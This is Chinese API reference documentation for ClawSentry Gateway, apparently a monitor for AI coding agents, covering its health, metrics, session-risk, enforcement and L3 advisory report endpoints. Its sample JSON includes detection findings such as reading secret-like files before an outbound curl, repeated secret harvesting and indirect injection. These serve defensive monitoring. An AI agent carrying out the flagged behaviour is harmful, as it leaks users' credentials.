---
title: 报表与监控
description: ClawSentry 报表、会话管理、告警和 SSE 实时推送端点的完整参考
---

<section class="cs-doc-hero cs-doc-hero--api" markdown>
<div class="cs-eyebrow">ClawSentry 报表 API</div>

## 报表与监控端点

<div class="cs-actions" markdown>
[API 概览](overview.md){ .md-button .md-button--primary }
[Metric Dictionary](metric-dictionary.md){ .md-button }
[决策端点](decisions.md){ .md-button }
</div>
</section>

ClawSentry Gateway 提供一整套 HTTP API 用于健康检查、聚合统计、会话追踪、告警管理和实时事件流推送。所有 `/report/*` 端点均需 Bearer Token 认证（除非 `CS_AUTH_TOKEN` 为空）。

!!! abstract "本页快速导航"
    [GET /health](#get-health) · [GET /metrics](#get-metrics) · [GET /report/summary](#get-report-summary) · [GET /report/policy-drift](#get-report-policy-drift) · [GET /report/sessions](#get-report-sessions) · [GET /report/session/{id}](#get-report-session) · [GET /report/session/{id}/risk](#get-report-session-risk) · [GET /report/session/{id}/post-action](#get-report-session-post-action) · [L3 advisory endpoints](#l3-advisory-endpoints) · [GET /report/stream (SSE)](#get-report-stream) · [GET /report/alerts](#get-report-alerts) · [Enterprise OS 20 类风险统计](#enterprise-os-risk-taxonomy-query) · [POST /report/alerts/{id}/ack](#post-report-alerts-acknowledge) · [GET /ahp/patterns](#get-ahp-patterns) · [POST /ahp/patterns/confirm](#post-ahp-patterns-confirm)

---

## GET /health — 健康检查 {#get-health}

返回 Gateway 的运行状态。此端点**不需要认证**。

### 响应

```json
{
  "status": "healthy",
  "uptime_seconds": 3600.5,
  "cache_size": 12,
  "trajectory_count": 4523,
  "trajectory_backend": "sqlite",
  "policy_engine": "L1+L2",
  "rpc_version": "sync_decision.1.0",
  "auth_enabled": true
}
```

| 字段 | 类型 | 说明 |
|------|------|------|
| `status` | string | 运行状态，始终为 `"healthy"` |
| `uptime_seconds` | float | 进程运行时间（秒） |
| `cache_size` | int | 幂等性缓存当前条目数 |
| `trajectory_count` | int | 轨迹数据库总记录数 |
| `trajectory_backend` | string | 持久化后端类型 |
| `policy_engine` | string | 当前启用的决策层 |
| `rpc_version` | string | 支持的 RPC 协议版本 |
| `auth_enabled` | bool | HTTP 认证是否启用 |

### curl 示例

```bash
curl http://127.0.0.1:8080/health
```

---

## GET /metrics — Prometheus 指标 {#get-metrics}

以 Prometheus exposition format 导出运行时指标。需安装 `clawsentry[metrics]` 可选依赖（`pip install "clawsentry[metrics]"`）。

### 认证

由 `CS_METRICS_AUTH` 控制（默认 `false`）：

- `CS_METRICS_AUTH=true`：需要 Bearer Token 认证
- `CS_METRICS_AUTH=false` 或未设置：允许无认证访问（适合受网络边界保护的 Prometheus 抓取）

### 降级行为

未安装 `prometheus_client` 时，`/metrics` 返回纯文本提示：

```
# ClawSentry metrics disabled (prometheus_client not installed)
```

### 指标列表

#### Counters

| 指标名 | 标签 | 说明 |
|--------|------|------|
| `clawsentry_decisions_total` | `verdict`, `risk_level`, `tier`, `source_framework` | 决策总数 |
| `clawsentry_llm_calls_total` | `provider`, `tier`, `status` | LLM API 调用总数 |
| `clawsentry_llm_tokens_total` | `provider`, `direction` | Token 消耗总量 |
| `clawsentry_llm_cost_usd_total` | `provider` | Legacy 预估 LLM 成本（美元）；新 UI/治理口径优先使用 token 指标 |

#### Histograms

| 指标名 | 标签 | 说明 |
|--------|------|------|
| `clawsentry_decision_latency_seconds` | `tier`, `source_framework` | 决策延迟分布 |
| `clawsentry_risk_score` | `source_framework` | 风险评分分布 |

#### Gauges

| 指标名 | 标签 | 说明 |
|--------|------|------|
| `clawsentry_active_sessions` | (无) | 当前活跃会话数 |
| `clawsentry_defers_pending` | (无) | 等待审批的 DEFER 决策数 |

### 标签值说明

| 标签 | 可选值 |
|------|--------|
| `verdict` | `allow`, `block`, `defer`, `modify` |
| `risk_level` | `low`, `medium`, `high`, `critical` |
| `tier` | `L1`, `L2`, `L3` |
| `source_framework` | `a3s-code`, `openclaw`, `claude-code`, `codex` |
| `provider` | `anthropic`, `openai` |
| `status` | `ok`, `timeout`, `error` |
| `direction` | `input`, `output` |

### 常用 PromQL 查询

```promql
# 每分钟决策速率
rate(clawsentry_decisions_total[5m])

# 高风险决策占比
sum(rate(clawsentry_decisions_total{risk_level=~"high|critical"}[5m]))
/ sum(rate(clawsentry_decisions_total[5m]))

# P99 决策延迟
histogram_quantile(0.99, rate(clawsentry_decision_latency_seconds_bucket[5m]))

# 每小时 LLM token 消耗
increase(clawsentry_llm_tokens_total[1h])
```

### curl 示例

```bash
# 有认证
curl -H "Authorization: Bearer $CS_AUTH_TOKEN" \
  http://127.0.0.1:8080/metrics

# 无认证（需 CS_METRICS_AUTH=false）
curl http://127.0.0.1:8080/metrics
```

---

## GET /report/summary — 聚合统计 {#get-report-summary}

跨框架聚合统计，涵盖事件分布、决策分布、风险趋势等。

### 查询参数

| 参数 | 类型 | 默认值 | 说明 |
|------|------|--------|------|
| `window_seconds` | int | `null`（全部） | 时间窗口限制（1 ~ 604800 秒） |

### 响应

```json
{
  "total_records": 1250,
  "by_source_framework": {
    "a3s-code": 800,
    "openclaw": 450
  },
  "by_event_type": {
    "pre_action": 900,
    "post_action": 300,
    "session": 50
  },
  "by_decision": {
    "allow": 1000,
    "block": 150,
    "defer": 80,
    "modify": 20
  },
  "by_risk_level": {
    "low": 800,
    "medium": 300,
    "high": 120,
    "critical": 30
  },
  "by_actual_tier": {
    "L1": 1200,
    "L2": 50
  },
  "by_caller_adapter": {
    "a3s-adapter.v1": 800,
    "openclaw-adapter.v1": 450
  },
  "invalid_event": {
    "count_1m": 0,
    "count_5m": 2,
    "count_15m": 5,
    "rate_5m": 0.004,
    "rate_15m": 0.002,
    "alerts": []
  },
  "high_risk_trend": {
    "windows": {
      "5m": {"count": 3, "total": 50, "ratio": 0.06},
      "15m": {"count": 8, "total": 150, "ratio": 0.053},
      "60m": {"count": 20, "total": 500, "ratio": 0.04}
    },
    "direction_5m": "up",
    "series_5m": [
      {
        "bucket_start": "2026-03-23T09:00:00+00:00",
        "bucket_end": "2026-03-23T09:05:00+00:00",
        "total_count": 40,
        "high_or_critical_count": 2,
        "ratio": 0.05
      }
    ]
  },
  "system_security_posture": {
    "score_0_100": 72.5,
    "level": "elevated",
    "drivers": [
      {"key": "high_sessions", "label": "High-risk sessions", "value": 3}
    ],
    "window_seconds": 3600,
    "generated_at": "2026-04-25T12:00:05Z",
    "decision_affecting": false
  },
  "decision_path_io": {
    "record_path": {"calls": 25},
    "reporting": {
      "report_summary": {"calls": 1}
    }
  },
  "decision_path_io_pressure": {
    "level": "healthy",
    "max_seconds": 0.01,
    "decision_affecting": false
  },
  "generated_at": "2026-03-23T10:30:00+00:00",
  "window_seconds": null
}
```

**关键指标说明：**

- `invalid_event` —— 无效事件计数与速率，超过阈值时触发告警
    - `count_1m > 20` → `critical` 告警
    - `rate_5m > 1%` → `critical` 告警
    - `rate_15m 在 0.1%-1%` → `warning` 告警
- `high_risk_trend` —— 高风险事件趋势
    - `direction_5m`: `up`（上升）/ `down`（下降）/ `flat`（持平）
    - `series_5m`: 最近 12 个 5 分钟桶的时序数据

### curl 示例

```bash
# 全量统计
curl -H "Authorization: Bearer $CS_AUTH_TOKEN" \
  http://127.0.0.1:8080/report/summary

# 最近 1 小时
curl -H "Authorization: Bearer $CS_AUTH_TOKEN" \
  "http://127.0.0.1:8080/report/summary?window_seconds=3600"
```

---

## GET /report/policy-drift — 策略漂移报告 {#get-report-policy-drift}

按 `workspace_root` / `source_framework` / `session_id` / `rule_family` 聚合当前窗口与前一窗口的策略漂移，并在每个 metric cell 中保留 request、rule、registry、fallback、adapter effect 追踪字段。

!!! note "边界"
    这是 traceability / reporting surface，用于解释策略变化和审计回链；它不用于对外发布排名或综合结论。

### 查询参数

| 参数 | 类型 | 默认值 | 说明 |
|------|------|--------|------|
| `window_seconds` | int | `3600` | 当前窗口长度；前一窗口使用同样长度 |
| `max_cells` | int | `200` | 返回的 drift cells 上限 |

### 响应

```json
{
  "generated_at": "2026-05-15T00:00:00+08:00",
  "window_seconds": 3600,
  "comparison_window_seconds": 3600,
  "grouping_dimensions": ["workspace_root", "source_framework", "session_id", "rule_family"],
  "total_cells": 1,
  "cells": [
    {
      "cell_id": "/workspace/payments|codex|sess-001|skill_trust",
      "workspace_root": "/workspace/payments",
      "source_framework": "codex",
      "session_id": "sess-001",
      "rule_family": "skill_trust",
      "current": {
        "record_count": 1,
        "decision_distribution": {"block": 1},
        "risk_distribution": {"high": 1},
        "rule_hits": {"ambiguous_skill_alias": 1},
        "block_rate": 1.0,
        "high_or_critical_rate": 1.0
      },
      "previous": {
        "record_count": 1,
        "decision_distribution": {"allow": 1},
        "risk_distribution": {"low": 1},
        "rule_hits": {"unknown_skill_identity": 1},
        "block_rate": 0.0,
        "high_or_critical_rate": 0.0
      },
      "delta": {"record_count": 0, "block_rate": 1.0, "high_or_critical_rate": 1.0},
      "traceability": {
        "request_ids": ["req-current"],
        "record_ids": ["42"],
        "event_ids": ["evt-current"],
        "registry_states": ["unlisted"],
        "rule_evidence": ["ambiguous_skill_alias"],
        "fallback_paths": ["gateway_policy"],
        "adapter_effect_result_ids": ["effect-current"]
      }
    }
  ]
}
```

### curl 示例

```bash
curl -H "Authorization: Bearer $CS_AUTH_TOKEN" \
  "http://127.0.0.1:8080/report/policy-drift?window_seconds=3600&max_cells=100"
```

---

## GET /report/sessions — 活跃会话列表 {#get-report-sessions}

返回当前内存中的活跃会话列表，支持按风险等级排序和过滤。

### 查询参数

| 参数 | 类型 | 默认值 | 可选值 | 说明 |
|------|------|--------|--------|------|
| `status` | string | `active` | `active`, `all` | 会话状态过滤 |
| `sort` | string | `risk_level` | `risk_level`, `last_event` | 排序方式 |
| `limit` | int | `50` | 1-200 | 返回条目数量上限 |
| `min_risk` | string | `null` | `low`, `medium`, `high`, `critical` | 最低风险等级过滤 |
| `window_seconds` | int | `null` | 1-604800 | 时间窗口（按最后活动时间） |

### 响应

```json
{
  "sessions": [
    {
      "session_id": "session-001",
      "agent_id": "agent-001",
      "source_framework": "a3s-code",
      "caller_adapter": "a3s-adapter.v1",
      "workspace_root": "/workspace/repo-alpha",
      "transcript_path": "/workspace/repo-alpha/.a3s/session-001.jsonl",
      "current_risk_level": "high",
      "cumulative_score": 5,
      "latest_composite_score": 2.4,
      "session_risk_sum": 6.7,
      "session_risk_ewma": 1.9,
      "latest_post_action_score": 1.0,
      "post_action_score_ewma": 0.72,
      "risk_points_sum": 5,
      "window_risk_summary": {
        "window_seconds": null,
        "generated_at": "2026-03-23T10:31:00+00:00",
        "event_count": 25,
        "high_or_critical_count": 3,
        "latest_composite_score": 2.4,
        "session_risk_sum": 6.7,
        "session_risk_ewma": 1.9,
        "risk_points_sum": 5,
        "risk_velocity": "up",
        "score_range": [0.0, 3.0],
        "score_semantics": {
          "zero_with_no_events": "no_data_not_confirmed_low_risk",
          "decision_affecting": false
        },
        "decision_affecting": false
      },
      "post_action_score_summary": {
        "window_seconds": null,
        "event_count": 3,
        "latest_post_action_score": 1.0,
        "post_action_score_sum": 2.4,
        "post_action_score_avg": 0.8,
        "post_action_score_ewma": 0.72,
        "score_range": [0.0, 3.0],
        "score_semantics": {
          "zero_with_no_events": "no_post_action_data_not_confirmed_low_risk",
          "decision_affecting": false
        },
        "decision_affecting": false
      },
      "event_count": 25,
      "high_or_critical_count": 3,
      "decision_distribution": {
        "allow": 20,
        "block": 3,
        "defer": 2
      },
      "first_event_at": "2026-03-23T10:00:00+00:00",
      "last_event_at": "2026-03-23T10:30:00+00:00",
      "d4_accumulation": 4,
      "l3_state": "completed",
      "l3_reason_code": "suspicious_sequence_matched",
      "evidence_summary": {
        "reasoning_turns": 3,
        "tools_observed": ["read_trajectory", "read_file"],
        "key_findings": [
          "Read secret-like file before outbound curl",
          "L3 retained bounded transcript evidence"
        ]
      }
    }
  ],
  "total_active": 15,
  "decision_path_io": {
    "record_path": {"calls": 25},
    "reporting": {
      "report_sessions": {"calls": 1}
    }
  },
  "generated_at": "2026-03-23T10:31:00+00:00",
  "window_seconds": null
}
```

**字段说明：**

| 字段 | 说明 |
|------|------|
| `source_framework` | 会话来自哪个 Agent 框架 |
| `workspace_root` | 会话绑定的工作空间根目录；Web UI 用它做 workspace 分组 |
| `transcript_path` | 该 session 的 transcript / 日志路径（若框架提供） |
| `caller_adapter` | Gateway 侧识别到的调用适配器 |
| `decision_distribution` | 该 session 内各判决类型分布 |
| `l3_state` / `l3_reason_code` | 当前 session 最新一次 L3 运行态与原因码摘要 |
| `evidence_summary` | 当前 session 最新一次保留下来的紧凑证据摘要 |
| `cumulative_score` | Legacy 兼容字段；不要当作窗口累计 composite score |
| `latest_composite_score` | 最新事件的原始 composite score，供展示和观测使用 |
| `session_risk_sum` / `session_risk_ewma` | 与 `window_seconds` 对齐的窗口风险总量和 EWMA 展示分；EWMA 使用 `alpha=0.3`（首个分数作为种子，之后 `0.3 * score + 0.7 * previous`），范围 `0.0..3.0`，无窗口事件时 `0.0` 表示 `no_data_not_confirmed_low_risk`，且默认不影响 Gateway 判决 |
| `latest_post_action_score` / `post_action_score_ewma` | post-action 安全围栏分与 session 级 EWMA；范围 `0.0..3.0` |
| `post_action_score_summary` | post-action score 窗口聚合容器；字段合同见 [Metric Dictionary](metric-dictionary.md) |
| `score_range` / `score_semantics` | 明确 `0.0..3.0` 范围及空数据语义；`event_count/post_action_event_count == 0` 时 `0.0` 表示“无数据”，不是“确认低风险” |
| `risk_points_sum` | 窗口内风险等级点数累计（low=0, medium=1, high=2, critical=3） |
| `window_risk_summary` | 窗口聚合容器；字段合同见 [Metric Dictionary](metric-dictionary.md) |

!!! note "Token-first LLM governance"
    报表 payload 中的 LLM budget snapshot 以 `enabled`、`limit_tokens`、`used_input_tokens`、`used_output_tokens`、`used_total_tokens`、`remaining_tokens`、`scope`、`exhausted` 为主。`daily_budget_usd`、`daily_spend_usd`、`remaining_usd` 仍可作为旧客户端兼容字段存在，但 Web UI 不再把 USD 估算作为主治理信号。

!!! info "为什么这里新增了 `workspace_root` 和 `transcript_path`？"
    从 `0.3.8` 开始，Web UI 的核心视图不再只按 session_id 平铺，而是按 `framework -> workspace -> session` 组织。因此 API 也同步暴露工作空间级元数据，方便前端和外部系统直接做分组与定位。

!!! note "当前版本新增的 L3 摘要字段"
    当前版本的 session summary 已直接暴露 `l3_state`、`l3_reason_code`、compact `evidence_summary`，并在响应顶层附带 `decision_path_io`。如果只做值守或 dashboard 聚合，通常不需要再去展开完整 `l3_trace`。

### curl 示例

```bash
# 按风险排序，前 10 个会话
curl -H "Authorization: Bearer $CS_AUTH_TOKEN" \
  "http://127.0.0.1:8080/report/sessions?sort=risk_level&limit=10"

# 仅高风险会话
curl -H "Authorization: Bearer $CS_AUTH_TOKEN" \
  "http://127.0.0.1:8080/report/sessions?min_risk=high"
```

---

## GET /report/session/{id} — 会话轨迹回放 {#get-report-session}

返回指定会话的完整事件与决策轨迹（从 SQLite 轨迹数据库查询）。

### 路径参数

| 参数 | 说明 |
|------|------|
| `id` | 会话 ID |

### 查询参数

| 参数 | 类型 | 默认值 | 说明 |
|------|------|--------|------|
| `limit` | int | `100` | 最大返回记录数（1-1000） |
| `window_seconds` | int | `null` | 时间窗口限制 |

### 响应

```json
{
  "session_id": "session-001",
  "record_count": 3,
  "records": [
    {
      "event": {
        "event_id": "evt-001",
        "event_type": "pre_action",
        "tool_name": "bash",
        "session_id": "session-001",
        "source_framework": "a3s-code",
        "occurred_at": "2026-03-23T10:00:00+00:00",
        "payload": {"command": "ls -la"}
      },
      "decision": {
        "decision": "allow",
        "reason": "Low risk operation",
        "risk_level": "low",
        "policy_id": "L1-default-allow"
      },
      "risk_snapshot": {
        "risk_level": "low",
        "composite_score": 1,
        "dimensions": {"d1": 1, "d2": 0, "d3": 0, "d4": 0, "d5": 0},
        "classified_by": "L1"
      },
      "meta": {
        "request_id": "a3s-evt-001-...",
        "actual_tier": "L1",
        "deadline_ms": 100,
        "caller_adapter": "a3s-adapter.v1",
        "l3_state": "completed",
        "l3_reason_code": "suspicious_sequence_matched"
      },
      "recorded_at": "2026-03-23T10:00:00.001+00:00",
      "recorded_at_ts": 1774530000.001,
      "l3_trace": {
        "trigger_detail": "secret_plus_network",
        "evidence_summary": {
          "reasoning_turns": 3,
          "tools_observed": ["read_trajectory", "read_file"]
        }
      }
    }
  ],
  "decision_path_io": {
    "record_path": {"calls": 25},
    "reporting": {
      "replay_session": {"calls": 1}
    }
  },
  "generated_at": "2026-03-23T10:31:00+00:00",
  "window_seconds": null
}
```

!!! note "关于 `l3_trace` 和紧凑摘要"
    `l3_trace` 仍然是最完整的结构化证据，但当前报表和 UI 更常直接消费其提炼后的 `l3_state`、`l3_reason_code`、`trigger_detail` 与 compact `evidence_summary`。如果你只需要值守级上下文，优先看这些顶层字段；只有在做深度审计或复盘时，再回退到完整 `l3_trace`。

### curl 示例

```bash
curl -H "Authorization: Bearer $CS_AUTH_TOKEN" \
  "http://127.0.0.1:8080/report/session/session-001?limit=50"
```

---

## GET /report/session/{id}/risk — 会话风险详情 {#get-report-session-risk}

返回指定会话的实时风险状态，包括 D1-D6 维度得分、风险时间线和使用的工具列表。

### 路径参数

| 参数 | 说明 |
|------|------|
| `id` | 会话 ID |

### 查询参数

| 参数 | 类型 | 默认值 | 说明 |
|------|------|--------|------|
| `limit` | int | `100` | 时间线最大条目数（1-1000） |
| `window_seconds` | int | `null` | 时间窗口限制 |

### 响应

```json
{
  "session_id": "session-001",
  "agent_id": "agent-001",
  "source_framework": "a3s-code",
  "caller_adapter": "a3s-adapter.v1",
  "workspace_root": "/workspace/repo-alpha",
  "transcript_path": "/workspace/repo-alpha/.a3s/session-001.jsonl",
  "current_risk_level": "high",
  "cumulative_score": 5,
  "latest_composite_score": 2.4,
  "session_risk_sum": 6.7,
  "session_risk_ewma": 1.9,
  "latest_post_action_score": 1.0,
  "post_action_score_ewma": 0.72,
  "risk_points_sum": 5,
  "window_risk_summary": {
    "window_seconds": 3600,
    "generated_at": "2026-03-23T10:31:00+00:00",
    "event_count": 12,
    "high_or_critical_count": 3,
    "latest_composite_score": 2.4,
    "session_risk_sum": 6.7,
    "session_risk_ewma": 1.9,
    "risk_points_sum": 5,
    "risk_velocity": "up",
    "decision_affecting": false
  },
  "post_action_score_summary": {
    "window_seconds": 3600,
    "generated_at": "2026-03-23T10:31:00+00:00",
    "event_count": 3,
    "latest_post_action_score": 1.0,
    "post_action_score_sum": 2.4,
    "post_action_score_avg": 0.8,
    "post_action_score_ewma": 0.72,
    "score_range": [0.0, 3.0],
    "decision_affecting": false
  },
  "event_count": 25,
  "high_or_critical_count": 3,
  "first_event_at": "2026-03-23T10:00:00+00:00",
  "last_event_at": "2026-03-23T10:30:00+00:00",
  "dimensions_latest": {
    "d1": 3,
    "d2": 2,
    "d3": 1,
    "d4": 1,
    "d5": 0,
    "d6": 2
  },
  "risk_timeline": [
    {
      "event_id": "evt-001",
      "occurred_at": "2026-03-23T10:00:00+00:00",
      "risk_level": "low",
      "composite_score": 1,
      "tool_name": "bash",
      "decision": "allow"
    },
    {
      "event_id": "evt-002",
      "occurred_at": "2026-03-23T10:05:00+00:00",
      "risk_level": "high",
      "composite_score": 5,
      "tool_name": "bash",
      "decision": "block"
    }
  ],
  "risk_hints_seen": ["destructive_pattern", "shell_execution"],
  "tools_used": ["bash", "file_editor"],
  "actual_tier_distribution": {
    "L1": 23,
    "L2": 2
  },
  "l3_state": "degraded",
  "l3_reason_code": "hard_cap_exceeded",
  "evidence_summary": {
    "reasoning_turns": 4,
    "tools_observed": ["read_trajectory", "read_transcript"],
    "key_findings": [
      "Repeated secret harvest observed",
      "Budget-capped evidence retained before degrade"
    ]
  },
  "l3_advisory": {
    "latest_review": {
      "review_id": "l3adv-001",
      "snapshot_id": "l3snap-001",
      "l3_state": "completed",
      "advisory_only": true
    },
    "latest_job": {
      "job_id": "l3job-001",
      "job_state": "completed",
      "runner": "llm_provider"
    }
  },
  "decision_path_io": {
    "record_path": {"calls": 25},
    "reporting": {
      "report_session_risk": {"calls": 1}
    }
  },
  "generated_at": "2026-03-23T10:31:00+00:00",
  "window_seconds": null
}
```

**字段说明：**

| 字段 | 说明 |
|------|------|
| `agent_id` / `source_framework` / `caller_adapter` | 会话身份元数据 |
| `workspace_root` / `transcript_path` | 工作空间与 transcript 定位信息，供 Web UI 和人工排障使用 |
| `dimensions_latest` | 该会话最新一次评估的 D1-D6 维度得分 |
| `event_count` / `high_or_critical_count` | 窗口事件数与 high/critical 事件数 |
| `first_event_at` / `last_event_at` | 该会话的首个/最新事件时间 |
| `risk_timeline` | 风险变化时间线（按事件发生时间排序） |
| `post_action_scores` | post-action 安全围栏评分时间线；由 `/report/session/{id}/post-action` 提供更聚焦版本 |
| `latest_post_action_score` / `post_action_score_ewma` | 最新 post-action score 与 session 级滑动平均分，范围 `0.0..3.0` |
| `post_action_score_summary` | 与 `window_seconds` 对齐的 post-action score 聚合容器 |
| `risk_hints_seen` | 该会话曾触发的所有风险提示集合 |
| `tools_used` | 该会话使用过的工具集合 |
| `actual_tier_distribution` | 各决策层级的使用次数分布 |
| `l3_state` / `l3_reason_code` | 当前 session 最新一次 L3 运行态与原因码摘要 |
| `evidence_summary` | 当前 session 最新一次紧凑 retained-evidence 摘要 |
| `l3_advisory` | advisory snapshot/job/review 摘要；用于展示 frozen evidence full-review，不改变 canonical decision |

### curl 示例

```bash
curl -H "Authorization: Bearer $CS_AUTH_TOKEN" \
  "http://127.0.0.1:8080/report/session/session-001/risk"
```

---

## GET /report/session/{id}/post-action — Post-action 安全围栏分 {#get-report-session-post-action}

返回指定会话的 post-action 安全围栏评分时间线、最新分、算术平均和 session 级滑动平均分（EWMA）。该接口用于 Enterprise OS / Dashboard 将“调用前风险态势”与“工具输出事后安全风险”分开建模。

### 路径参数

| 参数 | 说明 |
|------|------|
| `id` | 会话 ID |

### 查询参数

| 参数 | 类型 | 默认值 | 说明 |
|------|------|--------|------|
| `limit` | int | `100` | 时间线最大条目数（1-1000） |
| `window_seconds` | int | `null` | 时间窗口限制（1-604800 秒） |

### 响应

```json
{
  "session_id": "session-001",
  "latest_post_action_score": 1.0,
  "post_action_score_sum": 2.4,
  "post_action_score_avg": 0.8,
  "post_action_score_ewma": 0.72,
  "post_action_event_count": 3,
  "score_range": [0.0, 3.0],
  "score_semantics": {
    "zero_with_no_events": "no_post_action_data_not_confirmed_low_risk",
    "decision_affecting": false,
    "aggregation": "latest, sum, avg, and EWMA are separate from session_risk_ewma; do not add raw channels"
  },
  "decision_affecting": false,
  "post_action_score_summary": {
    "window_seconds": 3600,
    "generated_at": "2026-03-23T10:31:00+00:00",
    "event_count": 3,
    "latest_post_action_score": 1.0,
    "post_action_score_sum": 2.4,
    "post_action_score_avg": 0.8,
    "post_action_score_ewma": 0.72,
    "score_range": [0.0, 3.0],
    "score_semantics": {
      "zero_with_no_events": "no_post_action_data_not_confirmed_low_risk",
      "decision_affecting": false
    },
    "decision_affecting": false
  },
  "post_action_scores": [
    {
      "event_id": "evt-post-001",
      "occurred_at": "2026-03-23T10:05:00+00:00",
      "tool_name": "read_file",
      "source_framework": "a3s-code",
      "tier": "escalate",
      "patterns_matched": ["indirect_injection"],
      "score": 1.0,
      "handling": "broadcast"
    }
  ],
  "decision_path_io": {
    "record_path": {"calls": 25},
    "reporting": {
      "report_session_post_action": {"calls": 1}
    }
  },
  "generated_at": "2026-03-23T10:31:00+00:00",
  "window_seconds": 3600
}
```

**字段说明：**

| 字段 | 说明 |
|------|------|
| `latest_post_action_score` | 窗口内最新 post-action 安全围栏分；范围 `0.0..3.0` |
| `post_action_score_ewma` | session 级 post-action score EWMA（`alpha=0.3`）；Enterprise OS 可与 `session_risk_ewma` 组合派生指标 |
| `post_action_score_avg` / `post_action_score_sum` | 窗口内 post-action score 算术均值 / 总量 |
| `post_action_score_summary` | 与 `window_seconds` 对齐的聚合容器；默认不影响 Gateway 判决 |
| `post_action_scores` | 单次 post-action 分析结果时间线；包含 `tier`、命中模式和 handling |
| `decision_path_io` | 报表路径 I/O 观测快照，帮助排查 reporting/session registry 延迟；不影响判决 |

### curl 示例

```bash
curl -H "Authorization: Bearer $CS_AUTH_TOKEN" \
  "http://127.0.0.1:8080/report/session/session-001/post-action?window_seconds=3600"
```

---

## GET /report/session/{id}/enforcement — 会话强制策略状态 {#get-report-session-enforcement}

查询指定会话的强制执行策略状态（A-7 会话级强制策略）。

### 响应 — 正常状态

```json
{
  "session_id": "session-001",
  "state": "normal",
  "action": null,
  "triggered_at": null,
  "last_high_risk_at": null,
  "high_risk_count": null
}
```

### 响应 — 强制状态

```json
{
  "session_id": "session-001",
  "state": "enforced",
  "action": "defer",
  "triggered_at": 1774530000.0,
  "last_high_risk_at": 1774530300.0,
  "high_risk_count": 5
}
```

| 字段 | 说明 |
|------|------|
| `state` | `normal`（正常）或 `enforced`（强制中） |
| `action` | 强制执行的动作：`defer`、`block` 或 `l3_require` |
| `triggered_at` | 强制策略触发时间（monotonic 时间戳） |
| `last_high_risk_at` | 最后一次高风险事件时间 |
| `high_risk_count` | 高风险事件累计数量 |

### curl 示例

```bash
curl -H "Authorization: Bearer $CS_AUTH_TOKEN" \
  http://127.0.0.1:8080/report/session/session-001/enforcement
```

---

## POST /report/session/{id}/enforcement — 手动释放强制策略 {#post-report-session-enforcement}

手动释放指定会话的强制执行策略，无需等待 cooldown 自然过期。

### 请求

```json
{
  "action": "release"
}
```

!!! warning "`action` 必须为 `\"release\"`"
    当前仅支持 `release` 操作。其他值返回 400 错误。

### 成功响应

```json
{
  "session_id": "session-001",
  "released": true
}
```

如果会话未处于强制状态：

```json
{
  "session_id": "session-001",
  "released": false
}
```

释放后，Gateway 会通过 SSE 广播 `session_enforcement_change` 事件（`state: "released"`）。

### curl 示例

```bash
curl -X POST http://127.0.0.1:8080/report/session/session-001/enforcement \
  -H "Authorization: Bearer $CS_AUTH_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"action": "release"}'
```

---

## L3 advisory endpoints {#l3-advisory-endpoints}

L3 advisory 是一条独立的咨询审查流程：它可以冻结 session 的 bounded trajectory records、排队或运行一次 review，但结果始终是 `advisory_only=true`，不会修改原始 canonical decision。用户向说明见 [L3 咨询审查](../decision-layers/l3-advisory.md)。

### POST /report/session/{id}/l3-advisory/snapshots

为指定 session 创建 frozen evidence snapshot。

```json
{
  "trigger_event_id": "operator-action-id",
  "trigger_detail": "operator_requested_snapshot",
  "from_record_id": 1,
  "to_record_id": 42,
  "max_records": 100,
  "max_tool_calls": 0
}
```

响应包含 `snapshot_id`、`event_range`、`record_count`、`risk_summary`、`advisory_only=true`。

### POST /report/l3-advisory/reviews 与 PATCH /report/l3-advisory/review/{review_id}

用于附加或更新 advisory review lifecycle。状态集合为 `pending` / `running` / `completed` / `failed` / `degraded`；terminal 状态会带 `completed_at`。

Completed/degraded review 可以附带可选自然语言字段：

| 字段 | 说明 |
|------|------|
| `analysis_summary` | bounded 一段式摘要，用于 operator 快速判断复盘结论 |
| `analysis_points` | bounded 字符串列表，通常 2–5 条证据要点 |
| `operator_next_steps` | bounded 字符串列表，通常 1–3 条下一步建议 |

这些字段通过 review JSON extension / action payload 传播，不需要表结构迁移，也不会改变 `advisory_only=true` / `canonical_decision_mutated=false`。

### POST /report/l3-advisory/snapshot/{snapshot_id}/run-local-review

对 frozen snapshot 执行 deterministic local review。该 runner 只读取 snapshot record range，不读取 live workspace，不调用真实 LLM，也不启动 scheduler。

### POST /report/l3-advisory/snapshot/{snapshot_id}/jobs

为 snapshot 创建 advisory job。默认 job 处于 `queued`，等待显式 worker 调用。

```json
{
  "runner": "llm_provider"
}
```

### GET /report/l3-advisory/jobs

列出 advisory jobs，常用过滤：

- `state=queued|running|completed|failed`
- `runner=llm_provider|deterministic_local`
- `session_id=sess-001`

响应包含 `jobs[]`、`advisory_only=true` 与 `canonical_decision_mutated=false`。

### POST /report/l3-advisory/jobs/run-next

显式运行最旧的 queued job。选择与 claim 使用 queued-only 语义；`running` / `completed` / `failed` job 不会被 rerun。

```json
{
  "runner": "llm_provider",
  "session_id": "sess-001",
  "dry_run": false
}
```

### POST /report/l3-advisory/jobs/drain

有界运行 queued jobs。默认 `max_jobs=1`，硬上限 `10`；不 sleep、不 poll、不启动 daemon。

```json
{
  "runner": "llm_provider",
  "max_jobs": 2,
  "dry_run": false
}
```

### POST /report/l3-advisory/job/{job_id}/run-local

显式运行 deterministic local job，完成后返回 `job` 与 `review`。

### POST /report/l3-advisory/job/{job_id}/run-worker

显式运行 worker adapter。公共 API 支持 `llm_provider`；它继承共享 `CS_LLM_*` 配置，缺配置时写入 `degraded` review。

### POST /report/session/{id}/l3-advisory/full-review

Operator-triggered full review：一次请求完成“冻结证据 + 排队 job + 可选执行一次 runner”。

```json
{
  "trigger_event_id": "operator-action-id",
  "trigger_detail": "operator_requested_full_review",
  "from_record_id": 1,
  "to_record_id": 42,
  "max_records": 100,
  "max_tool_calls": 0,
  "runner": "llm_provider",
  "run": true
}
```

响应示例：

```json
{
  "snapshot": {"snapshot_id": "l3snap-..."},
  "job": {"job_id": "l3job-...", "job_state": "completed"},
  "review": {"review_id": "l3adv-...", "l3_state": "completed", "advisory_only": true},
  "advisory_only": true,
  "canonical_decision_mutated": false
}
```

`run=false` 时只排队 job，`review` 为 `null`。CLI 包装见 [`clawsentry l3 full-review`](../cli/index.md#clawsentry-l3)。

---

### 读取 L3 snapshot {#get-l3-advisory-snapshots}

只读端点用于查看已冻结的 L3 advisory 证据，不会触发新的审查任务，也不会改写历史 CanonicalDecision。

| 端点 | 说明 |
| --- | --- |
| `GET /report/session/{session_id}/l3-advisory/snapshots` | 列出某个 session 的 evidence snapshots。 |
